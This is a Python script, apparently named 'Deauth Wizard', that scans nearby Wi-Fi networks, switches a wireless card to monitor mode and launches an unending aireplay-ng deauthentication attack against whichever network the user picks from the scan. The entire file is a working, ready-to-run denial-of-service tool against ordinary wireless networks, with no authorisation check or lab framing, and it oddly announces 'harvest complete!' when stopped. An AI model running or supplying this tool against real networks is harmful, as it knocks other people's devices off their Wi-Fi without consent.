#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import logging
from typing import List, Dict, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_RUNNING = "\033[31m" if COLOR_ENABLED else ""
COLOR_STOP = "\033[33m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def freq_to_channel(freq: int) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return (freq - 5000) // 5
    return None


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def scan_wireless_networks(interface: str) -> List[Dict[str, Optional[str]]]:
    try:
        result = subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        logging.error("Required tool 'iw' not found!")
        return []

    if result.returncode != 0:
        logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
        return []

    networks: Dict[str, Dict[str, Optional[str]]] = {}
    current: Dict[str, Optional[str]] = {}
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("BSS "):
            if current.get("bssid") and current.get("ssid"):
                networks[current["bssid"]] = current
            current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
            continue
        if line.startswith("freq:"):
            try:
                freq_val = int(line.split()[1])
                current["channel"] = freq_to_channel(freq_val)
            except (ValueError, IndexError):
                current["channel"] = None
            continue
        if line.startswith("signal:"):
            parts = line.split()
            try:
                current["signal"] = float(parts[1])
            except (IndexError, ValueError):
                current["signal"] = None
            continue
        if line.startswith("SSID:"):
            ssid_val = line.split(":", 1)[1].strip()
            current["ssid"] = ssid_val if ssid_val else "<hidden>"

    if current.get("bssid") and current.get("ssid"):
        networks[current["bssid"]] = current

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    return sorted_networks


def select_network(attack_interface: str) -> Dict[str, Optional[str]]:
    while True:
        networks = scan_wireless_networks(attack_interface)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input("Rescan? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info("Available networks:")
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input("Select network (number, or R to rescan): ").strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("Available interfaces:")
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input("Select attack interface (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


ATTACK_PROCESS: Optional[subprocess.Popen] = None
SELECTED_INTERFACE: Optional[str] = None
ORIGINAL_MODE = "managed"


def enable_monitor_mode(interface: str, channel: Optional[int]) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(["iw", "dev", interface, "set", "type", "monitor"], stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            logging.error("Failed to set monitor mode: %s", result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        if channel:
            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
        return True
    except Exception as exc:
        logging.error("Failed to enable monitor mode: %s", exc)
        return False


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        # Best effort; don't raise during cleanup
        pass


def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS
    bssid = target["bssid"]
    channel = target["channel"]
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    if channel:
        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)

    try:
        ATTACK_PROCESS = subprocess.Popen(
            ["aireplay-ng", "-0", "0", "-a", bssid, interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
        )
    except FileNotFoundError:
        logging.error("Required tool 'aireplay-ng' not found!")
        return False
    except Exception as exc:
        logging.error("Failed to start deauth attack: %s", exc)
        return False

    time.sleep(1)
    if ATTACK_PROCESS.poll() is not None:
        err_output = ATTACK_PROCESS.stderr.read().strip() if ATTACK_PROCESS.stderr else "unknown error"
        logging.error("Deauth process exited early: %s", err_output or "unknown error")
        ATTACK_PROCESS = None
        return False

    return True


def stop_attack() -> None:
    global ATTACK_PROCESS
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        ATTACK_PROCESS.terminate()
        try:
            ATTACK_PROCESS.wait(timeout=3)
        except subprocess.TimeoutExpired:
            ATTACK_PROCESS.kill()
    ATTACK_PROCESS = None


def cleanup():
    logging.info("Cleaning up...")
    stop_attack()
    if SELECTED_INTERFACE:
        restore_managed_mode(SELECTED_INTERFACE)
    logging.info("Cleanup completed")


def run_deauth_session() -> bool:
    global SELECTED_INTERFACE

    interfaces = list_network_interfaces()
    SELECTED_INTERFACE = select_interface(interfaces)

    input(f"Press Enter to switch {SELECTED_INTERFACE} to monitor mode...")
    if not enable_monitor_mode(SELECTED_INTERFACE, None):
        return False

    input(f"Press Enter to scan networks on {SELECTED_INTERFACE}...")
    target_network = select_network(SELECTED_INTERFACE)
    logging.info(
        "Target selected: %s (%s)",
        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
        target_network["bssid"],
    )

    input(f"Press Enter to start Deauth attack on {style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)}...")

    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
        return False

    logging.info("=" * 50)
    logging.info(f"Deauth attack is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
    logging.info(f"Target: {style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)} ({target_network['bssid']})")
    logging.info("=" * 50)
    logging.info(
        "Press %s to %s",
        style("Ctrl+C", STYLE_BOLD),
        style("STOP the attack", COLOR_STOP, STYLE_BOLD),
    )

    try:
        while True:
            time.sleep(1)
            if ATTACK_PROCESS and ATTACK_PROCESS.poll() is not None:
                logging.error("Deauth process exited unexpectedly.")
                return False
    except KeyboardInterrupt:
        logging.info(color_text("Stopping attack...", COLOR_STOP))
    finally:
        stop_attack()
        restore_managed_mode(SELECTED_INTERFACE)

    logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
    while True:
        choice = input("Exit script (E) or restart (R): ").strip().lower()
        if choice in {"e", "exit"}:
            return False
        if choice in {"r", "restart"}:
            return True
        logging.warning("Please enter E or R.")


def main():
    logging.info(color_text("Deauth Wizard", COLOR_HEADER))
    logging.info("Starting Deauth Attack System")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "aireplay-ng"]
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            logging.error("Required tool '%s' not found!", tool)
            sys.exit(1)

    import atexit
    atexit.register(cleanup)

    while True:
        restart = run_deauth_session()
        if not restart:
            break
        logging.info(color_text("Restarting deauth wizard...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()
